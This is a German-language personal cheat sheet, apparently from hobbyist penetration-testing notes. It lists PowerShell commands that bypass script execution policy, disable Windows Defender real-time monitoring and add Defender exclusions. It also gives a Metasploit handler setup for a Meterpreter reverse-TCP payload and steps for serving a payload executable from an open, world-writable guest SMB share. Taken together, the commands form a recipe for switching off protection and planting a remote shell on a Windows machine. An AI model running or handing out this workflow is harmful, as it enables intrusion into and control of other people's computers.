# Notizen – 81a5terfr34k
## Windows: 

### Richtlinien mit Powershell Befehlen ändern:
- setzen (SET) 
- Anzeigen (Get) 

---

| Befehl                                                      | Beschreibung                       |
|-------------------------------------------------------------|------------------------------------|
| Get-ExecutionPolicy                                         | Ausführungsrichtlinien anzeigen    |
| Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass  | Skriptausführung zulassen          |
| Set-MpPreference -DisableRealtimeMonitoring $true           | Antivirenscanner ausschalten       |       
| Set-MpPreference -DisableRealtimeMonitoring $false          | Antivirenscanner einschalten       |
| Add-MpPreference -ExclusionExtension ".exe" ODER ".ps1"     | Ausnahmen hinzufügen (Dateityp)    |
| Add-MpPreference -ExclusionPath "C:\Lokaler-Pfad"           | Ausnahmen hinzufügen (Ordner)      |
| Add-MpPreference -ExclusionPath "\\192.168.x.x\SMB-Pfad"    | Ausnahmen hinzufügen (SMB/NAS)     |

---

--> Script ausführen mit: .\<scriptname>.ps1

---

## Linux:

- Payload erstellen: msfvenom
- Meterpreter Listener bereitstellen:

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <kali IP>
set LPORT 4444
set ExitOnSession false
exploit -j
````

---

- smbshare Ordner erstellen: sudo mkdir -p /srv/smbshare
- smbshare Ordner zugriff erteilen: sudo chmod -R 777 /srv/smbshare
- Payload nach smbshare Ordner verschieben: mv ~/Schreibtisch/PayloadStub.exe /srv/smbshare/
- Inhalt von smbshare kontrollieren: ls -l /srv/smbshare
- SMB Dienst starten: sudo systemctl start smbd
- SMB Dienst status prüfen: sudo systemctl status smbd
- Zugriff auf smbshare testen: smbclient //localhost/share -N
- aktive Samba Konfiguration anzeigen: testparm ( /etc/samba/smb.conf)
- SMB Konfigurations-DATEI bearbeiten: sudo nano /etc/samba/smb.conf  
- NEUEN [share]-Block ganz unten im dokument erstellen mit:

````
[share]
   path = /srv/smbshare
   browsable = yes
   read only = no
   guest ok = yes
   
[global]-Block ergänzen:
   map to guest = Bad User
````

- speichern: strg+0 
- schliessen: strg+x
- SMB Dienst neu starten: sudo systemctl restart smbd
